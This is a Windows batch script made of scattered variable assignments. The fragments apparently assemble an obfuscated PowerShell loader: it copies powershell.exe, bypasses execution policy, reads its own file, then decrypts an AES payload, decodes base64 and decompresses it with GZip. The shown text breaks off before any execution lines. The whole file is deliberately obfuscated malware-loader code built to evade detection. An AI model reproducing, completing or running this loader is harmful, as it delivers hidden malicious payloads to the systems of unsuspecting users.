@echo off
set "mITTQJigvY=:\"
set "hmErZOtOrG=ll"
set "NuaxSHVZgb=nd"
set "eHRYyckwFA=\v"
set "VdLPMcbMYX=xe"
set "nYlQFgHUOW=Wi"
set "BGByDDxXGH=py"
set "XhSHbtYXoY=co"
set "kqGzfmqiUI=\W"
set "TeCiTVYMVQ=we"
set "IbbOCewupW=rs"
set "YldWqDvFsU= /"
set "TWXkBctMOo=ws"
set "PcybPSAhZY=rS"
set "kBbFMSMHIT=ow"
set "feGvwIIjEB=ll"
set "OiatOLXGdM=st"
set "yLQtUryaLs=po"
set "wnQNvcVOmF=y "
set "fJxusghkJr=Po"
set "apsUEoxoJS=do"
set "OxrBbrcOyA=in"
set "tZmUBwSsdg=em"
set "gvsbShcTYw=we"
set "roIZWSHvbi=Sy"
set "FZkLtDfsNC=1."
set "ADiFswKbRQ=.e"
set "YpZkvrRXBy=he"
set "vrCIuLdvnu=s\"
set "DzLLJVSbIT=32"
set "dakwJCxgca=0\"
set "FdtFcUjQQb=he"
set "KpmSAZjwWJ= C"
set "hJJSFcNmix= %~dp0"
set "vQTLcxwZDx=cd"
set "jqrrXPOoPn=y.Cr"
set "QafIcYuNpM=in $"
set "kYvCNVAQOh=pose"
set "gDyoBaoXMD=vN, "
set "gwkRWTglOY=.Cry"
set "ucgWNtnVht=e]::"
set "lCKaZFVhLu=wr);"
set "iViVpMkffl=comm"
set "NMSSwSTZlP=rity"
set "arcMGpmrDO=$MiR"
set "ZgZjosVbzp=Wmt."
set "BuparAyyuv=brea"
set "YOsNTMGkPQ=le  "
set "xTQRZYBdHU=rity"
set "kkzvYKMxJj=)))"
set "blrGYcwSYl=yste"
set "MktjfTLINM=.-16"
set "glqyeenzUg=rofi"
set "UEJyxbmBGg= = ["
set "UKAmExamfa=grap"
set "ukbNvVwWsd=iron"
set "KdgaYXMurG=l5E7"
set "SkaiRFuyeT=rtS4"
set "GGIHeUHgxy=ay()"
set "EtbltSagAN=-ep "
set "QfWwrMOYWM=ress"
set "vDhaSgfdCu=dj0C"
set "SZYLTovBue=oin "
set "tQaFVPBreq=S = "
set "qMGPSIYeaI=e = "
set "arbfnCGCWW=oL'["
set "fHUkBCVggM=)($V"
set "dCqGDmywNQ=zuZI"
set "EmLlgmcbGG=S46e"
set "pmnyMReoff=eam("
set "TglLbkEQkW=pher"
set "GVnxbmayrx=ne);"
set "SnDrgVQKMO=join"
set "yMECmCHNdj=saBm"
set "jMLORKaxID=.Mod"
set "hbpEKaXJtn=g = "
set "OoVYxGLbZF=[Sys"
set "PSItcCmyKm=;$Mi"
set "GKJcKrnqll=stem"
set "sjwqzPgYLU=-nop"
set "NsxuMTZZFK=New-"
set "whxMOgUrSe=ktYS"
set "QPdzjVAWHc=oint"
set "NadKuosUAO=.Dis"
set "wneQMVApul=ct S"
set "eCrfLbraQZ=ptor"
set "LnXotNFAWi=lBlo"
set "vaxREaKXMq=-joi"
set "skOVKXLClo=lWzP"
set "aFOtlENdwB=$EqX"
set "zmcuEuUSfs= = $"
set "tQZTvOkfJx=.Cop"
set "RfPnYGUaUM=.GZi"
set "fBGaeKzEAQ=rans"
set "BeZeEERUIF= New"
set "brJMFvZcza=Uj ="
set "CiLQpwowqq=XvN."
set "NylLzQlmfk=gnir"
set "AwPQBfQkOg=New-"
set "RAkDAGmrZv=ateD"
set "OgAtDMQSBA=ObZn"
set "ScfWDXBiuy=OwT "
set "kScOqTusnY=m.Re"
set "aWbyDfjzaH='[-1"
set "mDiNNKFrNp=O.Me"
set "RaFYYmYdPE=onve"
set "NIwPcAoHHQ=.Mem"
set "NSklKwTwVT=Star"
set "IbWwVFAQaM=ypto"
set "aluLJTDiPz=N = "
set "qCdptJEBQL=.Dis"
set "wiLnxXxJVt=.Sec"
set "mlMRVWFXFJ=PTtG"
set "LwCoZAIJCJ=Comp"
set "jPkhHnflVf=y.Ci"
set "WZnUwaShzp=1..-"
set "kQMwCTQxyT=16] "
set "sdlVUUaYCD=form"
set "DDMzApeTMl='txe"
set "qoATHsdzVc=GObZ"
set "rYdISmnawo=Conv"
set "URzZVojfSy=S = "
set "OPAbFmZDgy=vert"
set "psGsvhaFLe=z.En"
set "nIWvAVaVug=MuiD"
set "vsWmuTyDHd=.Com"
set "HdXJzEHFms=ke($"
set "uQewCsfUzO=);$G"
set "BWrirJkteR=V = "
set "JYIiffgWBh=S, 0"
set "vUbhiMxiZv=);$l"
set "GaiGeRUayn=1] -"
set "jUkpBCpAPU=Syst"
set "AxrAEVrhHr=bjec"
set "JDruhaEtbZ=pres"
set "sKFtERHsjQ=oryS"
set "SDhcHAccnA=ptog"
set "dmGlGjBfnz=ddin"
set "ohDgWryrNu=]::("
set "pSAZIHgVMq=$Dkt"
set "SzAAPrqxCm= [st"
set "YcQDlVQNiv=-4] "
set "KpzrAoJLiI=L4Yi"
set "XDiCeurhOf= '')"
set "PBjOHcaWuO=d;$G"
set "dXjExZfVrj=tsWi"
set "bXnlYytdcU=orF'"
set "nZaTrzVrcV=YS ="
set "zeegEBOkvQ=Zn.I"
set "FUfiIvzAhS=ObZn"
set "xChnOfBGJY=('%~f0'"
set "FpAfUYVLit=tem."
set "DEsFvpbxAB=DktY"
set "tSGIsfIgzp=:: '"
set "JQJyOoSGQE=embl"
set "CFVPMSdVfr=Comp"
set "gBpXUcXuMp=)) {"
set "oPZJBWnZoG=zHhH"
set "aLDFfmOASJ=Disp"
set "CeLXxYsQqg=);$Q"
set "alNlfEhJcr=Disp"
set "sfMpEBIbIn=null"
set "XxYSHmIcFE=6esa"
set "TvGARngUej=ck($"
set "jdUdPNlIpQ=s75K"
set "HXDnqcPvXX=tem."
set "kwcDOZydeR=raph"
set "gAZwWiVQtQ=DktY"
set "QbZszqUpmD=-joi"
set "gSEjZElpbO=ose("
set "VQeaDCMXcD=ew-O"
set "xGIpgvANJp=em.I"
set "ctHUPtSZRp=ObZn"
